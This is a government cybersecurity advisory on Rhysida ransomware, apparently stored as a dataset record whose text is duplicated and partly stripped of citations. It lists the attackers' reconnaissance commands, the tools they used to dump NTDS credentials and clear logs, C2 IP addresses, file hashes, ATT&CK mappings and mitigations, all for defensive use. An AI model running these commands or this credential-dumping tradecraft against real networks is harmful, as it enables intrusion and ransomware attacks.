Ipconfig [T1016], whoami [T1033], nltest [T1482], and several net commands have been used to enumerate victim environments and gather information about domains. In one instance of using compromised credentials, actors leveraged net commands within PowerShell to identify logged-in users and performed reconnaissance on network accounts within the victim environment. Note: The following commands were not performed in the exact order listed.

net user [username] /domain [T1087.002]
net group “domain computers” /domain [T1018]
net group “domain admins” /domain [T1069.002]
net localgroup administrators [T1069.001]

Analysis of the master file table (MFT)[4] identified the victim system generated the ntuser.dat registry hive, which was created when the compromised user logged in to the system for the first time. This was considered anomalous due to the baseline of normal activity for that particular user and system. Note: The MFT resides within the New Technology File System (NTFS) and houses information about a file including its size, time and date stamps, permissions, and data content.
Leveraged Tools
Table 1 lists legitimate tools Rhysida actors have repurposed for their operations. The legitimate tools listed in this joint CSA are all publicly available. Use of these tools should not be attributed as malicious without analytical evidence to support they are used at the direction of or controlled by threat actors.
Disclaimer: Organizations are encouraged to investigate and vet use of these tools prior to performing remediation actions.

Table 1: Tools Leveraged by Rhysida Actors


Name
Description




cmd.exe
The native command line prompt utility.


PowerShell.exe
A native command line tool used to start a Windows PowerShell session in a Command Prompt window.


PsExec.exe
A tool included in the PsTools suite used to execute processes remotely. Rhysida actors heavily leveraged this tool for lateral movement and remote execution.


mstsc.exe
A native tool that establishes an RDP connection to a host.


PuTTY.exe
Rhysida actors have been observed creating Secure Shell (SSH) PuTTy connections for lateral movement. In one example, analysis of PowerShell console host history for a compromised user account revealed Rhysida actors leveraged PuTTy to remotely connect to systems via SSH [T1021.004].


PortStarter
A back door script written in Go that provides functionality for modifying firewall settings and opening ports to pre-configured command and control (C2) servers.[1]


secretsdump
A script used to extract credentials and other confidential information from a system. Rhysida actors have been observed using this for NTDS dumping [T1003.003] in various instances.


ntdsutil.exe

A standard Windows tool used to interact with the NTDS database. Rhysida actors used this tool to extract and dump the NTDS.dit database from the domain controller containing hashes for all Active Directory (AD) users.
Note: It is strongly recommended that organizations conduct domain-wide password resets and double Kerberos TGT password resets if any indication is found that the NTDS.dit file was compromised.



AnyDesk
A common software that can be maliciously used by threat actors to obtain remote access and maintain persistence [T1219]. AnyDesk also supports remote file transfer.


wevtutil.exe
A standard Windows Event Utility tool used to view event logs. Rhysida actors used this tool to clear a significant number of Windows event logs, including system, application, and security logs [T1070.001].


PowerView
A PowerShell tool used to gain situational awareness of Windows domains. Review of PowerShell event logs identified Rhysida actors using this tool to conduct additional reconnaissance-based commands and harvest credentials.



Rhysida Ransomware Characteristics
Execution
In one investigation, Rhysida actors created two folders in the C:\ drive labeled in and out, which served as a staging directory (central location) for hosting malicious executables. The in folder contained file names in accordance with host names on the victim’s network, likely imported through a scanning tool. The out folder contained various files listed in Table 2 below. Rhysida actors deployed these tools and scripts to assist system and network-wide encryption.

Table 2: Malicious Executables Affiliated with Rhysida Infections


File Name
Hash (SHA256)
Description




conhost.exe
6633fa85bb234a75927b23417313e51a4c155e12f71da3959e168851a600b010
A ransomware binary.


psexec.exe
078163d5c16f64caa5a14784323fd51451b8c831c73396b967b4e35e6879937b
A file used to execute a process on a remote or local host.


S_0.bat
1c4978cd5d750a2985da9b58db137fc74d28422f1e087fd77642faa7efe7b597
A batch script likely used to place 1.ps1 on victim systems for ransomware staging purposes [T1059.003].


1.ps1
4e34b9442f825a16d7f6557193426ae7a18899ed46d3b896f6e4357367276183
Identifies an extension block list of files to encrypt and not encrypt.


S_1.bat
97766464d0f2f91b82b557ac656ab82e15cae7896b1d8c98632ca53c15cf06c4
A batch script that copies conhost.exe (the encryption binary) on an imported list of host names within the C:\Windows\Temp directory of each system.


S_2.bat
918784e25bd24192ce4e999538be96898558660659e3c624a5f27857784cd7e1
Executes conhost.exe on compromised victim systems, which encrypts and appends the extension of .Rhysida across the environment.



Rhysida ransomware uses a Windows 64-bit Portable Executable (PE) or common object file format (COFF) compiled using MinGW via the GNU Compiler Collection (GCC), which supports various programming languages such as C, C++, and Go. The cryptographic ransomware application first injects the PE into running processes on the compromised system [T1055.002]. Additionally, third-party researchers identified evidence of Rhysida actors developing custom tools with program names set to “Rhysida-0.1” [T1587].
Encryption
After mapping the network, the ransomware encrypts data using a 4096-bit RSA encryption key with a ChaCha20 algorithm [T1486]. The algorithm features a 256-bit key, a 32-bit counter, and a 96-bit nonce along with a four-by-four matrix of 32-bit words in plain text. Registry modification commands [T1112] are not obfuscated, displayed as plain-text strings and executed via cmd.exe.
Rhysida’s encryptor runs a file to encrypt and modify all encrypted files to display a .rhysida extension.[5] Following encryption, a PowerShell command deletes the binary [T1070.004] from the network using a hidden command window [T1564.003]. The Rhysida encryptor allows arguments -d (select a directory) and -sr (file deletion), defined by the authors of the code as parseOptions.[6] After the lines of binary strings complete their tasks, they delete themselves through the control panel to evade detection.
Data Extortion
Rhysida actors reportedly engage in “double extortion” [T1657]—demanding a ransom payment to decrypt victim data and threatening to publish the sensitive exfiltrated data unless the ransom is paid.[5],[7] Rhysida actors direct victims to send ransom payments in Bitcoin to cryptocurrency wallet addresses provided by the threat actors. As shown in Figure 1, Rhysida ransomware drops a ransom note named “CriticalBreachDetected” as a PDF file—the note provides each company with a unique code and instructions to contact the group via a Tor-based portal.

 

Figure 1: Rhysida Ransom Note

Identified in analysis and also listed in open source reporting, the contents of the ransom note are embedded as plain-text in the ransom binary, offering network defenders an opportunity to deploy string-based detection for alerting on evidence of the ransom note. Rhysida threat actors may target systems that do not use command-line operating systems. The format of the PDF ransom notes could indicate that Rhysida actors only target systems that are compatible with handling PDF documents.[8]
INDICATORS OF COMPROMISE
On November 10, 2023, Sophos published TTPs and IOCs identified from analysis conducted for six separate incidents.[9] The C2 IP addresses listed in Table 3 were derived directly from Sophos’ investigations and are listed on GitHub among other indicators.[10]

Table 3: C2 IP Addresses Used for Rhysida Operations


C2 IP Address




5.39.222[.]67


5.255.99[.]59


51.77.102[.]106


108.62.118[.]136


108.62.141[.]161


146.70.104[.]249


156.96.62[.]58


157.154.194[.]6



Additional IOCs were obtained from FBI, CISA, and the MS-ISAC’s investigations and analysis. The email addresses listed in Table 4 are associated with Rhysida actors’ operations. Rhysida actors have been observed creating Onion Mail email accounts for services or victim communication, commonly in the format: [First Name][Last Name]@onionmail[.]org.

Table 4: Email Addresses Used to Support Rhysida Operations


Email Address




rhysidaeverywhere@onionmail[.]org


rhysidaofficial@onionmail[.]org



Rhysida actors have also been observed using the following files and executables listed in Table 5 to support their operations.
Disclaimer: Organizations are encouraged to investigate the use of these files for related signs of compromise prior to performing remediation actions.

Table 5: Files Used to Support Rhysida Operations


File Name
Hash (SHA256)




Sock5.sh
48f559e00c472d9ffe3965ab92c6d298f8fb3a3f0d6d203cd2069bfca4bf3a57


PsExec64.exe
edfae1a69522f87b12c6dac3225d930e4848832e3c551ee1e7d31736bf4525ef


PsExec.exe
078163d5c16f64caa5a14784323fd51451b8c831c73396b967b4e35e6879937b


PsGetsid64.exe
201d8e77ccc2575d910d47042a986480b1da28cf0033e7ee726ad9d45ccf4daa


PsGetsid.exe
a48ac157609888471bf8578fb8b2aef6b0068f7e0742fccf2e0e288b0b2cfdfb


PsInfo64.exe
de73b73eeb156f877de61f4a6975d06759292ed69f31aaf06c9811f3311e03e7


PsInfo.exe
951b1b5fd5cb13cde159cebc7c60465587e2061363d1d8847ab78b6c4fba7501


PsLoggedon64.exe
fdadb6e15c52c41a31e3c22659dd490d5b616e017d1b1aa6070008ce09ed27ea


PsLoggedon.exe
d689cb1dbd2e4c06cd15e51a6871c406c595790ddcdcd7dc8d0401c7183720ef


PsService64.exe
554f523914cdbaed8b17527170502199c185bd69a41c81102c50dbb0e5e5a78d


PsService.exe
d3a816fe5d545a80e4639b34b90d92d1039eb71ef59e6e81b3c0e043a45b751c


Eula.txt
8329bcbadc7f81539a4969ca13f0be5b8eb7652b912324a1926fc9bfb6ec005a


psfile64.exe
be922312978a53c92a49fefd2c9f9cc098767b36f0e4d2e829d24725df65bc21


psfile.exe
4243dc8b991f5f8b3c0f233ca2110a1e03a1d716c3f51e88faf1d59b8242d329


pskill64.exe
7ba47558c99e18c2c6449be804b5e765c48d3a70ceaa04c1e0fae67ff1d7178d


pskill.exe
5ef168f83b55d2cbd2426afc5e6fa8161270fa6a2a312831332dc472c95dfa42


pslist64.exe
d3247f03dcd7b9335344ebba76a0b92370f32f1cb0e480c734da52db2bd8df60


pslist.exe
ed05f5d462767b3986583188000143f0eb24f7d89605523a28950e72e6b9039a


psloglist64.exe
5e55b4caf47a248a10abd009617684e969dbe5c448d087ee8178262aaab68636


psloglist.exe
dcdb9bd39b6014434190a9949dedf633726fdb470e95cc47cdaa47c1964b969f


pspasswd64.exe
8d950068f46a04e77ad6637c680cccf5d703a1828fbd6bdca513268af4f2170f


pspasswd.exe
6ed5d50cf9d07db73eaa92c5405f6b1bf670028c602c605dfa7d4fcb80ef0801


psping64.exe
d1f718d219930e57794bdadf9dda61406294b0759038cef282f7544b44b92285


psping.exe
355b4a82313074999bd8fa1332b1ed00034e63bd2a0d0367e2622f35d75cf140


psshutdown64.exe
4226738489c2a67852d51dbf96574f33e44e509bc265b950d495da79bb457400


psshutdown.exe
13fd3ad690c73cf0ad26c6716d4e9d1581b47c22fb7518b1d3bf9cfb8f9e9123


pssuspend64.exe
4bf8fbb7db583e1aacbf36c5f740d012c8321f221066cc68107031bd8b6bc1ee


pssuspend.exe
95a922e178075fb771066db4ab1bd70c7016f794709d514ab1c7f11500f016cd


PSTools.zip
a9ca77dfe03ce15004157727bb43ba66f00ceb215362c9b3d199f000edaa8d61


Pstools.chm
2813b6c07d17d25670163e0f66453b42d2f157bf2e42007806ebc6bb9d114acc


psversion.txt
8e43d1ddbd5c129055528a93f1e3fab0ecdf73a8a7ba9713dc4c3e216d7e5db4


psexesvc.exe
This artifact is created when a user establishes a connection using psexec. It is removed after the connection is terminated, which is why there is no hash available for this executable.



MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 6-15 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Additional notable TTPs have been published by the Check Point Incident Response Team.[11]

Table 6: Resource Development


Technique Title
ID
Use




Develop Capabilities
T1587
Rhysida actors have been observed developing resources and custom tools, particularly with program names set to “Rhysida-0.1” to gain access to victim systems.




Table 7: Initial Access


Technique Title
ID
Use




Valid Accounts
T1078
Rhysida actors are known to use valid credentials to access internal VPN access points of victims.


Exploit Public-Facing Application
T1190
Rhysida actors have been identified exploiting Zerologon, a critical elevation of privilege vulnerability within Microsoft’s Netlogon Remote Protocol.


Phishing
T1566
Rhysida actors are known to conduct successful phishing attacks.




Table 8: Execution


Technique Title
ID
Use




Command and Scripting Interpreter: PowerShell
T1059.001
Rhysida actors used PowerShell commands (ipconfig, nltest, net) and various scripts to execute malicious actions.


Command and Scripting Interpreter: Windows Command Shell
T1059.003
Rhysida actors used batch scripting to place 1.ps1 on victim systems to automate ransomware execution.




Table 9: Privilege Escalation


Technique Title
ID
Use




Process Injection: Portable Executable Injection
T1055.002
Rhysida actors injected a Windows 64-bit PE cryptographic ransomware application into running processes on compromised systems.




Table 10: Defense Evasion


Technique Title
ID
Use




Indicator Removal: Clear Windows Event Logs
T1070.001
Rhysida actors used wevtutil.exe to clear Windows event logs, including system, application, and security logs.


Indicator Removal: File Deletion
T1070.004
Rhysida actors used PowerShell commands to delete binary strings.


Hide Artifacts: Hidden Window
T1564.003
Rhysida actors have executed hidden PowerShell windows.




Table 11: Credential Access


Technique Title
ID
Use




OS Credential Dumping: NTDS
T1003.003
Rhysida actors have been observed using secretsdump to extract credentials and other confidential information from a system, then dumping NTDS credentials.


Modify Registry
T1112
Rhysida actors were observed running registry modification commands via cmd.exe.




Table 12: Discovery


Technique Title
ID
Use




System Network Configuration Discovery
T1016
Rhysida actors used the ipconfig command to enumerate victim system network settings.


Remote System Discovery
T1018
Rhysida actors used the command net group “domain computers” /domain to enumerate servers on a victim domain.


System Owner/User Discovery
T1033
Rhysida actors leveraged whoami and various net commands within PowerShell to identify logged-in users.


Permission Groups Discovery: Local Groups
T1069.001
Rhysida actors used the command net localgroup administrators to identify accounts with local administrator rights.


Permission Groups Discovery: Domain Groups
T1069.002
Rhysida actors used the command net group “domain admins” /domain to identify domain administrators.


Account Discovery: Domain Account
T1087.002
Rhysida actors used the command net user [username] /domain to identify account information.


Domain Trust Discovery
T1482
Rhysida actors used the Windows utility nltest to enumerate domain trusts.




Table 13: Lateral Movement


Technique Title
ID
Use




Remote Services: Remote Desktop Protocol
T1021.001
Rhysida actors are known to use RDP for lateral movement.


Remote Services: SSH
T1021.004
Rhysida actors used compromised user credentials to leverage PuTTy and remotely connect to victim systems via SSH.




Table 14: Command and Control


Technique Title
ID
Use




Remote Access Software
T1219
Rhysida actors have been observed using the AnyDesk software to obtain remote access to victim systems and maintain persistence.




Table 15: Impact


Technique Title
ID
Use




Data Encrypted for Impact
T1486
Rhysida actors encrypted victim data using a 4096-bit RSA encryption key that implements a ChaCha20 algorithm.


Financial Theft
T1657
Rhysida actors reportedly engage in “double extortion”— demanding a ransom payment to decrypt victim data and threatening to publish the sensitive exfiltrated data unless the ransom is paid.



MITIGATIONS
FBI, CISA, and the MS-ISAC recommend that organizations implement the mitigations below to improve your organization’s cybersecurity posture. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
These mitigations apply to all critical infrastructure organizations and network defenders. FBI, CISA, and the MS-ISAC recommend incorporating secure-by-design and -default principles, limiting the impact of ransomware techniques and strengthening overall security posture. For more information on secure by design, see CISA’s Secure by Design webpage.

Require phishing-resistant MFA for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems [CPG 2.H].
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally [CPG 2.N].
Implement verbose and enhanced logging within processes such as command line auditing[12] and process tracking[13].
Restrict the use of PowerShell using Group Policy and only grant access to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems should be permitted to use PowerShell [CPG 2.E].
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities [CPG 1.E, 2.S, 2.T].
Enable enhanced PowerShell logging [CPG 2.T, 2.U].

PowerShell logs contain valuable data, including historical operating system and registry interaction and possible TTPs of a threat actor’s PowerShell use.
Ensure PowerShell instances (using the latest version) have module, script block, and transcription logging enabled (e.g., enhanced logging).
The two logs that record PowerShell activity are the PowerShell Windows event log and the PowerShell operational log. FBI, CISA, and the MS-ISAC recommend turning on these two Windows event logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as possible.


Restrict the use of RDP and other remote desktop services to known user accounts and groups. If RDP is necessary, apply best practices such as [CPG 2.W]:

Implement MFA for privileged accounts using RDP.
Use Remote Credential Guard[14] to protect credentials, particularly domain administrator or other high value accounts.
Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Log RDP login attempts.


Secure remote access tools by:

Implementing application controls to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent the installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important as antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.
Apply the recommendations in CISA's joint Guide to Securing Remote Access Software.



In addition, FBI, CISA, and the MS-ISAC recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems [CPG 1.E].
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement [CPG 2.F].
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a network monitoring tool. To aid in detecting ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host [CPG 3.A].
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege (PoLP) [CPG 2.E].
Implement time-based access for accounts set at the admin level and higher [CPG 2.A, 2.E]. For example, the just-in-time (JIT) access method provisions privileged access when needed and can support the enforcement of PoLP (as well as the zero trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the AD level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, or the cloud).
Maintain offline backups of data and regularly maintain backups and their restoration (daily or weekly at minimum). By instituting this practice, organizations limit the severity of disruption to business operations [CPG 2.R].
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K, 2.L, 2.R].
Forward log files to a hardened centralized logging server, preferably on a segmented network [CPG 2.F]. Review logging retention rates, such as for VPNs and network-based logs.
Consider adding an email banner to emails received from outside your organization [CPG 2.M].
Disable hyperlinks in received emails.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI, CISA, and the MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, and the MS-ISAC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 6-15).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI, CISA, and the MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

CISA: #StopRansomware
CISA: #StopRansomware Vice Society
CISA: Known Exploited Vulnerabilities Catalog
NIST: CVE-2020-1472
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design
CISA: Implementing Phishing-Resistant MFA
CISA: Guide to Securing Remote Access Software

REPORTING
FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Rhysida actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
Additional details requested include: a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host and network-based indicators.
FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other threat actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents to the FBI’s Internet Crime Complaint Center (IC3) at Ic3.gov, a local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
REFERENCES

Microsoft: DEV-0832 (Vice Society) Opportunistic Ransomware Campaigns Impacting US Education Sector
FortiGuard Labs: Ransomware Roundup - Rhysida
Microsoft: Security Update Guide - CVE-2020-1472
Microsoft: Master File Table (Local File Systems)
SentinelOne: Rhysida
Secplicity: Scratching the Surface of Rhysida Ransomware
Cisco Talos: What Cisco Talos Knows about the Rhysida Ransomware
SOC Radar: Rhysida Ransomware Threat Profile
Sophos: A Threat Cluster’s Switch from Vice Society to Rhysida
Sophos: Vice Society - Rhysida IOCs (GitHub)
Check Point Research: Rhysida Ransomware - Activity and Ties to Vice Society
Microsoft: Command Line Process Auditing
Microsoft: Audit Process Tracking
Microsoft: Remote Credential Guard

ACKNOWLEDGEMENTS
Sophos contributed to this CSA.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and the MS-ISAC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, and the MS-ISAC.
VERSION HISTORY
November 15, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1657', 'T1055.002', 'T1219', 'T1482', 'T1016', 'T1190', 'T1021.004', 'T1087.002', 'T1069.002', 'T1069.001', 'T1018', 'T1112', 'T1587', 'T1564.003', 'T1078', 'T1070.004', 'T1566', 'T1059.001', 'T1033', 'T1003.003', 'T1021.001', 'T1486', 'T1059.003', 'T1070.001'}","






Actions to take today to mitigate malicious cyber activity:




Prioritize remediating known exploited vulnerabilities.
Enable multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.
Segment networks to prevent the spread of ransomware.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders detailing various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint CSA to disseminate known Rhysida ransomware IOCs and TTPs identified through investigations as recently as September 2023. Rhysida—an emerging ransomware variant—has predominately been deployed against the education, healthcare, manufacturing, information technology, and government sectors since May 2023. The information in this CSA is derived from related incident response investigations and malware analysis of samples discovered on victim networks.
FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of Rhysida ransomware and other ransomware incidents.
Download the PDF version of this report:


AA23-319A #StopRansomware: Rhysida Ransomware
(PDF,       674.56 KB
  )


For a downloadable copy of IOCs, see:


AA23-319A STIX XML
(XML,       115.31 KB
  )




AA23-319A STIX JSON
(JSON,       65.69 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the ATT&CK Tactics and Techniques section for tables mapped to the threat actors’ activity.
Overview
Threat actors leveraging Rhysida ransomware are known to impact “targets of opportunity,” including victims in the education, healthcare, manufacturing, information technology, and government sectors. Open source reporting details similarities between Vice Society (DEV-0832),1, activity and the actors observed deploying Rhysida ransomware. Additionally, open source reporting,2, has confirmed observed instances of Rhysida actors operating in a ransomware-as-a-service (RaaS) capacity, where ransomware tools and infrastructure are leased out in a profit-sharing model. Any ransoms paid are then split between the group and the affiliates.
For additional information on Vice Society actors and associated activity, see the joint CSA #StopRansomware: Vice Society.
Initial Access
Rhysida actors have been observed leveraging external-facing remote services to initially access and persist within a network. Remote services, such as virtual private networks (VPNs), allow users to connect to internal enterprise network resources from external locations. Rhysida actors have commonly been observed authenticating to internal VPN access points with compromised valid credentials, notably due to organizations lacking MFA enabled by default. Additionally, actors have been observed exploiting Zerologon (CVE-2020-1472)—a critical elevation of privileges vulnerability in Microsoft’s Netlogon Remote Protocol,—as well as conducting successful phishing attempts,. Note: Microsoft released a patch for CVE-2020-1472 on August 11, 2020.,3,
Living off the Land
Analysis identified Rhysida actors using living off the land techniques, such as creating Remote Desktop Protocol (RDP) connections for lateral movement, establishing VPN access, and utilizing PowerShell,. Living off the land techniques include using native (built into the operating system) network administration tools to perform operations. This allows the actors to evade detection by blending in with normal Windows systems and network activities.
Ipconfig, whoami, nltest, and several net commands have been used to enumerate victim environments and gather information about domains. In one instance of using compromised credentials, actors leveraged net commands within PowerShell to identify logged-in users and performed reconnaissance on network accounts within the victim environment. Note: The following commands were not performed in the exact order listed.

net user,username, /domain,
net group “domain computers” /domain,
net group “domain admins” /domain,
net localgroup administrators,

Analysis of the master file table (MFT),4, identified the victim system generated the ntuser.dat registry hive, which was created when the compromised user logged in to the system for the first time. This was considered anomalous due to the baseline of normal activity for that particular user and system. Note: The MFT resides within the New Technology File System (NTFS) and houses information about a file including its size, time and date stamps, permissions, and data content.
Leveraged Tools
Table 1 lists legitimate tools Rhysida actors have repurposed for their operations. The legitimate tools listed in this joint CSA are all publicly available. Use of these tools should not be attributed as malicious without analytical evidence to support they are used at the direction of or controlled by threat actors.
Disclaimer: Organizations are encouraged to investigate and vet use of these tools prior to performing remediation actions.

Rhysida Ransomware Characteristics
Execution
In one investigation, Rhysida actors created two folders in the C:\ drive labeled in and out, which served as a staging directory (central location) for hosting malicious executables. The in folder contained file names in accordance with host names on the victim’s network, likely imported through a scanning tool. The out folder contained various files listed in Table 2 below. Rhysida actors deployed these tools and scripts to assist system and network-wide encryption.

Rhysida ransomware uses a Windows 64-bit Portable Executable (PE) or common object file format (COFF) compiled using MinGW via the GNU Compiler Collection (GCC), which supports various programming languages such as C, C++, and Go. The cryptographic ransomware application first injects the PE into running processes on the compromised system,. Additionally, third-party researchers identified evidence of Rhysida actors developing custom tools with program names set to “Rhysida-0.1”,.
Encryption
After mapping the network, the ransomware encrypts data using a 4096-bit RSA encryption key with a ChaCha20 algorithm,. The algorithm features a 256-bit key, a 32-bit counter, and a 96-bit nonce along with a four-by-four matrix of 32-bit words in plain text. Registry modification commands, are not obfuscated, displayed as plain-text strings and executed via cmd.exe.
Rhysida’s encryptor runs a file to encrypt and modify all encrypted files to display a .rhysida extension.,5, Following encryption, a PowerShell command deletes the binary, from the network using a hidden command window,. The Rhysida encryptor allows arguments -d (select a directory) and -sr (file deletion), defined by the authors of the code as parseOptions.,6, After the lines of binary strings complete their tasks, they delete themselves through the control panel to evade detection.
Data Extortion
Rhysida actors reportedly engage in “double extortion”,—demanding a ransom payment to decrypt victim data and threatening to publish the sensitive exfiltrated data unless the ransom is paid.,5,7, Rhysida actors direct victims to send ransom payments in Bitcoin to cryptocurrency wallet addresses provided by the threat actors. As shown in Figure 1, Rhysida ransomware drops a ransom note named “CriticalBreachDetected” as a PDF file—the note provides each company with a unique code and instructions to contact the group via a Tor-based portal.

 

Figure 1: Rhysida Ransom Note

Identified in analysis and also listed in open source reporting, the contents of the ransom note are embedded as plain-text in the ransom binary, offering network defenders an opportunity to deploy string-based detection for alerting on evidence of the ransom note. Rhysida threat actors may target systems that do not use command-line operating systems. The format of the PDF ransom notes could indicate that Rhysida actors only target systems that are compatible with handling PDF documents.,8,
INDICATORS OF COMPROMISE
On November 10, 2023, Sophos published TTPs and IOCs identified from analysis conducted for six separate incidents.,9, The C2 IP addresses listed in Table 3 were derived directly from Sophos’ investigations and are listed on GitHub among other indicators.,10,

Additional IOCs were obtained from FBI, CISA, and the MS-ISAC’s investigations and analysis. The email addresses listed in Table 4 are associated with Rhysida actors’ operations. Rhysida actors have been observed creating Onion Mail email accounts for services or victim communication, commonly in the format:,First Name,Last Name,@onionmail,.,org.

Rhysida actors have also been observed using the following files and executables listed in Table 5 to support their operations.
Disclaimer: Organizations are encouraged to investigate the use of these files for related signs of compromise prior to performing remediation actions.

MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 6-15 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Additional notable TTPs have been published by the Check Point Incident Response Team.,11,










MITIGATIONS
FBI, CISA, and the MS-ISAC recommend that organizations implement the mitigations below to improve your organization’s cybersecurity posture. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
These mitigations apply to all critical infrastructure organizations and network defenders. FBI, CISA, and the MS-ISAC recommend incorporating secure-by-design and -default principles, limiting the impact of ransomware techniques and strengthening overall security posture. For more information on secure by design, see CISA’s Secure by Design webpage.

Require phishing-resistant MFA for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems,CPG 2.H,.
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally,CPG 2.N,.
Implement verbose and enhanced logging within processes such as command line auditing,12, and process tracking,13,.
Restrict the use of PowerShell using Group Policy and only grant access to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems should be permitted to use PowerShell,CPG 2.E,.
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities,CPG 1.E, 2.S, 2.T,.
Enable enhanced PowerShell logging,CPG 2.T, 2.U,.

PowerShell logs contain valuable data, including historical operating system and registry interaction and possible TTPs of a threat actor’s PowerShell use.
Ensure PowerShell instances (using the latest version) have module, script block, and transcription logging enabled (e.g., enhanced logging).
